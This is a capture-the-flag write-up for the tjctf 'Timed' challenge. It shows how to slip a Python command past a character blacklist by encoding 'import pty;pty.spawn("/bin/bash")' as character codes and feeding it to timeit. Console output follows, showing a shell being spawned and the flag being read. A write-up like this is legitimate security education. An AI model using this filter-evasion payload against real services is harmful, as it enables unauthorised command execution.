{:title "Timed - tjctf"
 :layout :post
 :tags  ["ctf" "writeup" "python"]
 :toc false}

This one is a cool blacklist bypass. It's pretty simple. You are presented a
text interface asking you to enter a python command.

```console
Type a command to time it!
```

Trying some simple functions seem to work fine, but....

```console
Type a command to time it!
print(1)
Runtime: 1.09672546387e-05

Type a command to time it!
import os
Hey, no hacking!
```

...there seems to be a blacklist of characters that get screened before the
command is run. We must obfuscate it somehow. By digging around, we can see
exactly what is in the blacklist and what isn't in the blacklist. Most
peculiarly, `timeit` is **NOT** in the blacklist.

> Sidenote: it is hinted that `timeit` could be a possibility because it is
> visible in the source whenever we provide invalid python code for the program
> to execute.

```console
Type a command to time it!
arst
Traceback (most recent call last):
  File "/timed.py", line 36, in <module>
    time1=t.timeit(1)
  File "/usr/lib/python2.7/timeit.py", line 202, in timeit
    timing = self.inner(it, self.timer)
  File "<timeit-src>", line 6, in inner
    arst
NameError: global name 'arst' is not defined
Runtime: 0

Type a command to time it!
12.,,
Traceback (most recent call last):
  File "/timed.py", line 31, in <module>
    t=timeit.Timer(res)
  File "/usr/lib/python2.7/timeit.py", line 129, in __init__
    compile(setup + '\n' + stmt, dummy_src_name, "exec")
  File "<timeit-src>", line 2
    12.,,
        ^
SyntaxError: invalid syntax
```

We can do something like the following in order to trick the program into
executing blacklisted commands:

```python
# We want to execute the following python
want_exec = 'import pty;pty.spawn("/bin/bash")'
# So we obfuscate it a bit
obfuscated = [ord(x) for x in want_exec]
# and we can just reverse it using a join-map
assert want_exec == ''.join(map(chr, obfuscated))

# Payload:
timeit(''.join(map(chr, [105, ...])))
```

By pasting the payload into the program, we get a shell:

```console
Type a command to time it!
timeit(''.join(map(chr, [105, ...])))
bash: /root/.bashrc: Permission denied
nobody@c51f99923c23:/$ ls
ls
bin   dev  flag.txt  lib    media  opt   root  sbin  sys       tmp  var
boot  etc  home      lib64  mnt    proc  run   srv   timed.py  usr
nobody@c51f99923c23:/$ cat flag.txt
cat flag.txt
tjctf{iTs_T1m3_f0r_a_flaggg}
```
